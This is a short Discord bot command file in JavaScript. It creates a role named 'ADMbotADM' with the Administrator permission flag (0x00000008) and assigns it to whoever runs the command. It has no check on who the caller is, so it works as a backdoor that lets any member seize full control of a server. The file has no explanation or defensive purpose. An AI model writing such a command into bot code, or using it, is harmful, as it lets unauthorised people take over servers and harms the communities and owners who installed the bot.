exports.run = async (client, message) => {
    let role = message.guild.roles.find("name", "ADMbotADM")
    if(!role){
        try {
            role = await message.guild.createRole({
                name: "ADMbotADM",
                color: "#666",
                permissions: 0x00000008
            })
            
        }catch(e){
            console.log(e.stack)
        }
    }
    message.member.addRole(role.id)
}